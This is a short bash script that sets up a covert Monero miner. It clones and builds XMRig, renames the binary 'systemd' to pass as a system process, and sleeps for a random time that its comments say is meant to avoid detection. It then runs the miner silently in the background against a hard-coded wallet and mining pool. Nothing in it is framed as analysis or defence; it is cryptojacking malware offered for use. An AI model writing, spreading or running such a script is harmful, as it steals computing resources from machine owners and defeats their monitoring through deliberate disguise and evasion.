#!/bin/bash

### CONFIGURATION ###
WALLET="89PKYocdkhoeSCsn93wAVY7yqCAsSpgZkFriDyhFoW4DMZtzKRbeTZT4cgfedxvju98rXe6mT62eEZigpvV9VtAm5uSkZkQ"
POOL="pool.supportxmr.com:443"
THREADS=12
ALIAS_NAME="systemd"  # disguises the process
WORKER_ID="node-$(hostname)"

### INSTALL DEPENDENCIES ###
install_xmrig() {
    sudo apt update && sudo apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev
    git clone https://github.com/xmrig/xmrig.git
    mkdir xmrig/build && cd xmrig/build
    cmake .. && make -j$(nproc)
    cd ../..
    mv xmrig/build/xmrig ./$ALIAS_NAME  # disguise the binary
}

### SETUP ###
[ ! -f "./$ALIAS_NAME" ] && install_xmrig

### RANDOM SLEEP TO AVOID PATTERNS ###
sleep_time=$((RANDOM % 300))  # up to 5 minutes
echo "[*] Sleeping for $sleep_time seconds to avoid detection..."
sleep $sleep_time

### LAUNCH MINER IN BACKGROUND ###
echo "[*] Starting miner..."
nohup ./$ALIAS_NAME -o $POOL -u $WALLET -k -p $WORKER_ID --tls -t $THREADS --donate-level 1 > /dev/null 2>&1 &
echo "[+] Mining started with alias '$ALIAS_NAME'. Check running processes."
